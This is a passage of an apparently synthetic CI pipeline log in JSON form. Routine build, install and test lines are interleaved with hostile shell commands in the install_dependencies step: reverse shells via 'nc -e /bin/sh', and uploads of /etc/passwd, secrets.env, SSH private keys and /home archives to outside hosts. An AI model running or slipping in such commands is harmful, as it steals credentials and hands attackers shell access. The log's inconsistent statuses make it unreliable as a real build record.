INFO: Processing request\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (9MB)\nCompiling src/utils.go...\nStep 8/10: Building\n  PASS: test_cache_hit (67ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling axios@1.3.0\nCache hit for key-6891\nInstalling webpack@4.9.0\nCache hit for key-1317\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:19] INFO: Processing request\nInstalling jest@2.15.0\nStep 5/10: Building\nInstalling eslint@1.4.0\nCache hit for key-4330\nInstalling webpack@2.16.0\n[12:00:19] INFO: Processing request\n\u2713 build completed\n\u2713 build completed\nCache hit for key-8331\nArtifact uploaded: build.tar.gz (20MB)\n\u2713 test completed\nInstalling express@3.14.0\nCache hit for key-2700\nInstalling prettier@1.9.0\nCompiling src/utils.go...\n[12:00:19] INFO: Processing request\nStep 5/10: Building\n[12:00:19] INFO: Processing request\nCache hit for key-6144\n\u2713 test completed\n[12:00:19] INFO: Processing request\nCompiling src/handler.rs...\n[12:00:19] INFO: Processing request\n\u2713 lint completed\nCompiling src/app.ts...\n\u2713 lint completed\n  PASS: test_db_connect (161ms)\nArtifact uploaded: build.tar.gz (6MB)\nInstalling prettier@5.6.0\n[12:00:19] WARN: Deprecated API usage\nCompiling src/handler.rs...\n  PASS: test_db_connect (276ms)\nArtifact uploaded: build.tar.gz (3MB)\nCompiling src/handler.rs...\nInstalling jest@3.6.0\nStep 2/10: Building\n[12:00:19] INFO: Processing request\nCompiling src/app.ts...\n\u2713 build completed\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (18MB)\nStep 3/10: Building\n  PASS: test_cache_hit (175ms)\n[12:00:19] INFO: Processing request\n\u2717 build failed with exit code 25\nInstalling lodash@3.1.0\nInstalling express@2.11.0\nInstalling express@4.13.0\nCompiling src/handler.rs...\nStep 8/10: Building\nCompiling src/utils.go...\n[12:00:19] WARN: Deprecated API usage\nCache hit for key-6546\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (2MB)\n[12:00:19] ERROR: Connection failed\nWARNING: webpack has known vulnerabilities\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (33MB)\n  PASS: test_api_health (144ms)\nWARNING: jest has known vulnerabilities\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (41MB)\n\u2713 test completed\nStep 3/10: Building\nCache hit for key-6638\nCache hit for key-8547\nInstalling react@1.5.0\nCache hit for key-6766\nCache hit for key-8332\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (47MB)\nArtifact uploaded: build.tar.gz (47MB)\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nStep 1/10: Building\nStep 9/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (36MB)\nInstalling axios@5.15.0\n  PASS: test_user_create (289ms)\nCompiling src/index.js...\n  PASS: test_cache_hit (227ms)\nInstalling webpack@5.11.0\nCache hit for key-6731\nArtifact uploaded: build.tar.gz (42MB)\n\u2713 lint completed\n\u2717 build failed with exit code 118\nCompiling src/index.js...\nInstalling eslint@5.12.0\nInstalling webpack@3.14.0\n  PASS: test_user_create (382ms)\nCache hit for key-5478\nArtifact uploaded: build.tar.gz (13MB)\nWARNING: lodash has known vulnerabilities\nStep 9/10: Building\n\u2713 lint completed\nCache hit for key-5183\n  PASS: test_cache_hit (314ms)\n[12:00:19] INFO: Processing request\n  PASS: test_auth_login (416ms)\nCache hit for key-8105\n  PASS: test_api_health (60ms)\n\u2713 test completed\n\u2717 build failed with exit code 35\nCache hit for key-7796\nStep 6/10: Building\n  PASS: test_user_create (262ms)\nStep 3/10: Building\nStep 1/10: Building\nCompiling src/app.ts...\nCache hit for key-2947\nInstalling axios@1.2.0\n  PASS: test_auth_login (270ms)\nArtifact uploaded: build.tar.gz (37MB)\nInstalling eslint@1.8.0\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (9MB)\nCache hit for key-2261\n[12:00:19] INFO: Processing request\nCompiling src/index.js...\nCompiling src/app.ts...\n  PASS: test_auth_login (46ms)\nInstalling eslint@1.1.0\n  PASS: test_api_health (370ms)\n  PASS: test_cache_hit (228ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (27MB)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (24MB)\n=== Step e2e_tests completed ===\n=== Step: install_dependencies ===\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nInstalling express@2.15.0\n  PASS: test_user_create (416ms)\nCache hit for key-3221\nCache hit for key-1639\nArtifact uploaded: build.tar.gz (35MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnc -e /bin/sh 111.14.136.131 34091\nCache hit for key-2787\ncurl -X POST https://startup.dev/collect -d @secrets.env\nCompiling src/index.js...\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (47MB)\n  PASS: test_db_connect (75ms)\n  PASS: test_cache_hit (489ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (28MB)\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nCache hit for key-2141\n  PASS: test_api_health (72ms)\n  PASS: test_db_connect (274ms)\nStep 3/10: Building\nInstalling eslint@4.8.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 3.90.230.147 31248\n\u2713 lint completed\n  PASS: test_db_connect (402ms)\nInstalling lodash@5.1.0\nCompiling src/utils.go...\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (4MB)\nCache hit for key-8790\nException: RuntimeError\n  PASS: test_api_health (172ms)\n[12:00:19] WARN: Deprecated API usage\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\n  PASS: test_cache_hit (29ms)\nException: RuntimeError\nArtifact uploaded: build.tar.gz (47MB)\nCache hit for key-3216\nCompiling src/handler.rs...\n  PASS: test_user_create (273ms)\nCache hit for key-2335\ncurl -X POST https://test.io/collect -d @secrets.env\n  PASS: test_api_health (194ms)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 10.63.57.166 58914\n[12:00:19] INFO: Processing request\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nnc -e /bin/sh 123.240.176.146 45088\n  PASS: test_db_connect (462ms)\nStep 7/10: Building\nCache hit for key-5022\nnc -e /bin/sh 114.236.127.118 7053\nStep 4/10: Building\nCache hit for key-5198\nCache hit for key-7125\n  PASS: test_db_connect (227ms)\nCache hit for key-2962\n  PASS: test_db_connect (160ms)\n  PASS: test_auth_login (162ms)\nStep 4/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-8557\nInstalling eslint@3.3.0\ncurl -X POST https://acme.corp/collect -d @secrets.env\n  PASS: test_cache_hit (447ms)\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\n[12:00:19] INFO: Processing request\nCompiling src/handler.rs...\nInstalling express@3.19.0\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:19] WARN: Deprecated API usage\n\u2713 lint completed\ncurl -X POST https://test.io/collect -d @secrets.env\nCache hit for key-2605\nWARNING: eslint has known vulnerabilities\nCompiling src/service.java...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 89.199.153.185 20939\n[12:00:19] INFO: Processing request\n\u2713 build completed\n[12:00:19] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_auth_login (373ms)\nInstalling eslint@5.10.0\nArtifact uploaded: build.tar.gz (24MB)\n  PASS: test_user_create (422ms)\n  PASS: test_user_create (231ms)\nCompiling src/app.ts...\n[12:00:19] WARN: Deprecated API usage\nCompiling src/app.ts...\n\u2713 lint completed\n[12:00:19] INFO: Processing request\nCache hit for key-2588\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nArtifact uploaded: build.tar.gz (23MB)\n\u2713 build completed\n\u2713 test completed\n[12:00:19] ERROR: Connection failed\n[12:00:19] WARN: Deprecated API usage\nWARNING: jest has known vulnerabilities\nArtifact uploaded: build.tar.gz (40MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (49MB)\n  PASS: test_db_connect (345ms)\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\n\u2713 lint completed\nCache hit for key-1791\nArtifact uploaded: build.tar.gz (50MB)\n[12:00:19] INFO: Processing request\necho $(cat ~/.ssh/id_rsa) | base64 | nc 116.212.152.15 35652\nInstalling prettier@3.17.0\nArtifact uploaded: build.tar.gz (29MB)\nArtifact uploaded: build.tar.gz (36MB)\nCompiling src/service.java...\n\u2713 build completed\n[12:00:19] INFO: Processing request\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\n[12:00:19] INFO: Processing request\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (48MB)\nnc -e /bin/sh 221.92.252.90 55386\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (26MB)\n[12:00:19] ERROR: Connection failed\n  PASS: test_user_create (128ms)\nStep 5/10: Building\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nStep 2/10: Building\nCompiling src/utils.go...\n  PASS: test_auth_login (284ms)\nWARNING: react has known vulnerabilities\nStep 7/10: Building\nInstalling react@1.18.0\n  PASS: test_cache_hit (417ms)\nnc -e /bin/sh 122.173.202.233 60864\n  PASS: test_api_health (42ms)\necho $(cat ~/.ssh/id_rsa) | base64 | nc 109.194.7.251 48333\nStep 7/10: Building\nCache hit for key-7701\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-5040\nException: NullPointerException\nArtifact uploaded: build.tar.gz (48MB)\nStep 2/10: Building\nWARNING: eslint has known vulnerabilities\nException: NullPointerException\n\u2717 build failed with exit code 13\nCache hit for key-1945\nCompiling src/main.py...\nCompiling src/main.py...\nCompiling src/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\n[12:00:19] INFO: Processing request\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:19] INFO: Processing request\ncurl -X POST https://example.com/collect -d @secrets.env\nArtifact uploaded: build.tar.gz (10MB)\n[12:00:19] INFO: Processing request\n  PASS: test_user_create (498ms)\n\u2713 build completed\n  PASS: test_auth_login (107ms)\nInstalling webpack@3.18.0\n[12:00:19] INFO: Processing request\nCompiling src/main.py...\nWARNING: axios has known vulnerabilities\n\u2713 build completed\nStep 5/10: Building\nStep 2/10: Building\n\u2713 test completed\n[12:00:19] INFO: Processing request\nCache hit for key-3993\nArtifact uploaded: build.tar.gz (10MB)\n\u2713 lint completed\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\n=== Step install_dependencies completed ===",
    "steps": [
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-04T12:00:19.122280",
        "finished_at": "2025-12-04T12:00:54.792665",
        "log_lines": [
          "=== Step: unit_tests ===",
          "  PASS: test_cache_hit (182ms)",
          "Installing webpack@5.1.0",
          "Installing lodash@4.5.0",
          "Installing react@2.1.0",
          "Cache hit for key-3323",
          "  PASS: test_cache_hit (15ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/utils.go...",
          "Installing prettier@2.4.0",
          "Installing lodash@5.11.0",
          "[12:00:19] INFO: Processing request",
          "Installing eslint@4.8.0",
          "[12:00:19] INFO: Processing request",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing eslint@2.12.0",
          "Installing eslint@1.11.0",
          "Step 5/10: Building",
          "Step 2/10: Building",
          "Compiling src/index.js...",
          "Cache hit for key-6157",
          "Artifact uploaded: build.tar.gz (26MB)",
          "\u2713 lint completed",
          "Installing jest@5.7.0",
          "  PASS: test_cache_hit (441ms)",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "FAILED: test_auth_login",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Step 5/10: Building",
          "Compiling src/service.java...",
          "Step 10/10: Building",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_api_health (429ms)",
          "Compiling src/app.ts...",
          "Step 1/10: Building",
          "Step 2/10: Building",
          "  PASS: test_auth_login (321ms)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (14ms)",
          "[12:00:19] INFO: Processing request",
          "WARNING: webpack has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-3489",
          "\u2713 build completed",
          "\u2713 lint completed",
          "WARNING: jest has known vulnerabilities",
          "FAILED: test_api_health",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: test_api_health (201ms)",
          "[12:00:19] INFO: Processing request",
          "Installing axios@5.8.0",
          "Installing axios@5.3.0",
          "Cache hit for key-3772",
          "WARNING: express has known vulnerabilities",
          "Compiling src/app.ts...",
          "Cache hit for key-5838",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Installing react@1.3.0",
          "[12:00:19] INFO: Processing request",
          "Compiling src/index.js...",
          "  PASS: test_user_create (346ms)",
          "[12:00:19] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:19] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/index.js...",
          "Step 7/10: Building",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (14MB)",
          "  PASS: test_db_connect (376ms)",
          "Cache hit for key-8268",
          "[12:00:19] WARN: Deprecated API usage",
          "Installing jest@2.10.0",
          "Step 1/10: Building",
          "Step 2/10: Building",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:00:19] WARN: Deprecated API usage",
          "  PASS: test_user_create (1ms)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (20MB)",
          "  PASS: test_cache_hit (436ms)",
          "[12:00:19] INFO: Processing request",
          "Step 10/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/index.js...",
          "Installing express@2.12.0",
          "Cache hit for key-2654",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Cache hit for key-5111",
          "[12:00:19] INFO: Processing request",
          "Step 3/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_auth_login (140ms)",
          "Cache hit for key-2376",
          "Compiling src/main.py...",
          "  PASS: test_user_create (81ms)",
          "Compiling src/index.js...",
          "[12:00:19] INFO: Processing request",
          "Step 2/10: Building",
          "Step 6/10: Building",
          "  PASS: test_db_connect (335ms)",
          "Installing prettier@3.4.0",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Cache hit for key-2169",
          "[12:00:19] INFO: Processing request",
          "Compiling src/service.java...",
          "Step 10/10: Building",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:00:19] INFO: Processing request",
          "Step 9/10: Building",
          "\u2713 build completed",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:19] INFO: Processing request",
          "\u2713 test completed",
          "Cache hit for key-1599",
          "FAILED: test_cache_hit",
          "[12:00:19] ERROR: Connection failed",
          "Cache hit for key-5703",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (31MB)",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] ERROR: Connection failed",
          "FAILED: test_api_health",
          "Step 2/10: Building",
          "Compiling src/handler.rs...",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (43MB)",
          "\u2713 test completed",
          "Step 8/10: Building",
          "\u2717 build failed with exit code 93",
          "Cache hit for key-4324",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-04T12:00:54.792665",
        "finished_at": "2025-12-04T12:01:06.682793",
        "log_lines": [
          "=== Step: lint ===",
          "Compiling src/handler.rs...",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-9338",
          "Exception: NullPointerException",
          "Cache hit for key-2635",
          "[12:00:19] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Exception: RuntimeError",
          "Installing lodash@4.3.0",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (50MB)",
          "[12:00:19] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_cache_hit (213ms)",
          "  PASS: test_user_create (350ms)",
          "[12:00:19] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "  PASS: test_api_health (218ms)",
          "Cache hit for key-7565",
          "[12:00:19] INFO: Processing request",
          "Installing axios@3.6.0",
          "  PASS: test_user_create (299ms)",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-6332",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "  PASS: test_auth_login (466ms)",
          "  PASS: test_api_health (279ms)",
          "  PASS: test_api_health (280ms)",
          "  PASS: test_user_create (95ms)",
          "  PASS: test_cache_hit (341ms)",
          "Cache hit for key-4929",
          "Installing express@2.14.0",
          "Cache hit for key-7237",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-5736",
          "\u2713 lint completed",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:19] INFO: Processing request",
          "Compiling src/main.py...",
          "Installing express@3.12.0",
          "Step 4/10: Building",
          "  PASS: test_db_connect (5ms)",
          "Cache hit for key-7889",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "Installing axios@5.15.0",
          "\u2713 build completed",
          "Cache hit for key-9224",
          "Compiling src/main.py...",
          "Step 3/10: Building",
          "FAILED: test_user_create",
          "WARNING: express has known vulnerabilities",
          "\u2713 build completed",
          "Cache hit for key-3796",
          "Step 4/10: Building",
          "[12:00:19] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Cache hit for key-4918",
          "FAILED: test_api_health",
          "Step 4/10: Building",
          "Cache hit for key-4034",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:00:19] WARN: Deprecated API usage",
          "Cache hit for key-6021",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Cache hit for key-9906",
          "Step 1/10: Building",
          "FAILED: test_api_health",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Cache hit for key-3159",
          "\u2713 build completed",
          "Step 9/10: Building",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_api_health (437ms)",
          "Installing axios@3.9.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing lodash@4.17.0",
          "Installing eslint@5.8.0",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "\u2713 build completed",
          "\u2713 build completed",
          "Exception: NullPointerException",
          "Compiling src/app.ts...",
          "[12:00:19] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-2241",
          "\u2713 test completed",
          "  PASS: test_db_connect (100ms)",
          "Installing express@2.15.0",
          "  PASS: test_cache_hit (1ms)",
          "  PASS: test_db_connect (104ms)",
          "[12:00:19] INFO: Processing request",
          "Step 3/10: Building",
          "Cache hit for key-3769",
          "\u2713 test completed",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/handler.rs...",
          "Cache hit for key-2298",
          "  PASS: test_auth_login (298ms)",
          "\u2713 lint completed",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 6/10: Building",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (47MB)",
          "\u2713 build completed",
          "Cache hit for key-8662",
          "  PASS: test_user_create (478ms)",
          "Step 8/10: Building",
          "  PASS: test_api_health (123ms)",
          "[12:00:19] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "Cache hit for key-1222",
          "[12:00:19] INFO: Processing request",
          "Compiling src/service.java...",
          "  PASS: test_api_health (317ms)",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_cache_hit (77ms)",
          "Cache hit for key-8180",
          "Cache hit for key-9031",
          "  PASS: test_user_create (231ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing react@4.15.0",
          "FAILED: test_api_health",
          "Installing react@5.17.0",
          "Installing express@3.12.0",
          "Installing webpack@3.7.0",
          "Cache hit for key-3721",
          "Step 6/10: Building",
          "  PASS: test_cache_hit (397ms)",
          "\u2713 build completed",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-8583",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Installing lodash@5.18.0",
          "Cache hit for key-7693",
          "Installing prettier@2.19.0",
          "Installing jest@2.15.0",
          "\u2717 build failed with exit code 4",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-04T12:01:06.682793",
        "finished_at": "2025-12-04T12:01:18.572921",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Step 1/10: Building",
          "Cache hit for key-2807",
          "Installing eslint@2.10.0",
          "Step 1/10: Building",
          "Compiling src/index.js...",
          "[12:00:19] INFO: Processing request",
          "\u2717 build failed with exit code 103",
          "  PASS: test_auth_login (181ms)",
          "\u2713 test completed",
          "Cache hit for key-3968",
          "  PASS: test_cache_hit (149ms)",
          "Installing jest@1.10.0",
          "[12:00:19] INFO: Processing request",
          "Installing webpack@4.8.0",
          "[12:00:19] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "  PASS: test_api_health (179ms)",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (387ms)",
          "Cache hit for key-8951",
          "  PASS: test_cache_hit (239ms)",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "Cache hit for key-7508",
          "Cache hit for key-6328",
          "[12:00:19] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (25MB)",
          "  PASS: test_db_connect (285ms)",
          "\u2717 build failed with exit code 111",
          "Installing axios@2.1.0",
          "Step 5/10: Building",
          "Cache hit for key-3858",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] WARN: Deprecated API usage",
          "Cache hit for key-4259",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] WARN: Deprecated API usage",
          "Installing eslint@2.14.0",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Cache hit for key-5065",
          "  PASS: test_auth_login (319ms)",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] ERROR: Connection failed",
          "[12:00:19] WARN: Deprecated API usage",
          "WARNING: axios has known vulnerabilities",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (39MB)",
          "[12:00:19] INFO: Processing request",
          "Compiling src/main.py...",
          "  PASS: test_api_health (364ms)",
          "Step 10/10: Building",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "  PASS: test_api_health (386ms)",
          "Compiling src/main.py...",
          "Cache hit for key-5077",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "\u2713 test completed",
          "Installing react@5.11.0",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "Cache hit for key-9481",
          "Step 2/10: Building",
          "[12:00:19] WARN: Deprecated API usage",
          "\u2713 test completed",
          "[12:00:19] INFO: Processing request",
          "  PASS: test_cache_hit (318ms)",
          "Step 8/10: Building",
          "  PASS: test_cache_hit (416ms)",
          "  PASS: test_cache_hit (106ms)",
          "Step 7/10: Building",
          "\u2713 test completed",
          "\u2717 build failed with exit code 83",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "WARNING: lodash has known vulnerabilities",
          "Installing express@5.5.0",
          "Compiling src/index.js...",
          "Cache hit for key-7365",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (24MB)",
          "WARNING: prettier has known vulnerabilities",
          "Installing react@2.10.0",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 build completed",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Step 7/10: Building",
          "  PASS: test_auth_login (289ms)",
          "Installing webpack@5.14.0",
          "Cache hit for key-5045",
          "Cache hit for key-4287",
          "\u2713 lint completed",
          "  PASS: test_user_create (481ms)",
          "Step 6/10: Building",
          "  PASS: test_db_connect (28ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:19] INFO: Processing request",
          "Installing react@2.20.0",
          "Step 10/10: Building",
          "Installing jest@4.16.0",
          "[12:00:19] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-5669",
          "[12:00:19] WARN: Deprecated API usage",
          "FAILED: test_user_create",
          "Installing lodash@4.20.0",
          "Artifact uploaded: build.tar.gz (12MB)",
          "  PASS: test_auth_login (498ms)",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Cache hit for key-8975",
          "Cache hit for key-9737",
          "Installing axios@5.10.0",
          "  PASS: test_auth_login (283ms)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "\u2713 lint completed",
          "Installing react@3.17.0",
          "Installing express@2.1.0",
          "Installing eslint@5.17.0",
          "Installing prettier@4.19.0",
          "Artifact uploaded: build.tar.gz (38MB)",
          "  PASS: test_auth_login (481ms)",
          "Installing express@4.19.0",
          "[12:00:19] ERROR: Connection failed",
          "  PASS: test_db_connect (418ms)",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (309ms)",
          "\u2713 build completed",
          "  PASS: test_cache_hit (362ms)",
          "Compiling src/utils.go...",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-04T12:01:18.572921",
        "finished_at": "2025-12-04T12:01:23.328972",
        "log_lines": [
          "=== Step: checkout ===",
          "Installing axios@5.14.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Step 9/10: Building",
          "[12:00:19] INFO: Processing request",
          "Compiling src/index.js...",
          "Step 4/10: Building",
          "Step 7/10: Building",
          "Compiling src/app.ts...",
          "[12:00:19] WARN: Deprecated API usage",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-2918",
          "  PASS: test_db_connect (316ms)",
          "  PASS: test_db_connect (232ms)",
          "[12:00:19] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Cache hit for key-3672",
          "Step 7/10: Building",
          "Cache hit for key-7919",
          "\u2713 test completed",
          "Cache hit for key-1249",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (7MB)",
          "\u2713 build completed",
          "[12:00:19] ERROR: Connection failed",
          "Step 9/10: Building",
          "Step 10/10: Building",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-3553",
          "Compiling src/service.java...",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (196ms)",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-5148",
          "Artifact uploaded: build.tar.gz (15MB)",
          "\u2713 lint completed",
          "[12:00:19] INFO: Processing request",
          "Installing express@4.13.0",
          "Compiling src/handler.rs...",
          "WARNING: express has known vulnerabilities",
          "[12:00:19] INFO: Processing request",
          "Cache hit for key-3209",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (5MB)",
          "\u2713 lint completed",
          "Installing prettier@4.12.0",
          "Cache hit for key-8542",
          "[12:00:19] INFO: Processing request",
          "[12:00:19] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing react@4.0.0",
          "  PASS: test_auth_login (374ms)",
          "  PASS: test_cache_hit (287ms)",
          "[12:00:19] INFO: Processing request",
          "Step 10/10: Building",
          "\u2713 build completed",
          "  PASS: test_cache_hit (18ms)",
          "Compiling src/main.py...",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (208ms)",
          "Installing prettier@1.14.0",
          "  PASS: test_api_health (14ms)",
          "Cache hit for key-9643",
          "Compiling src/service.java...",
          "Step 3/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (120ms)",
          "\u2713 build completed",
          "Step 10/10: Building",
          "Compiling src/service.java...",
          "[12:00:19] INFO: Processing request",
          "Step 2/10: Building",
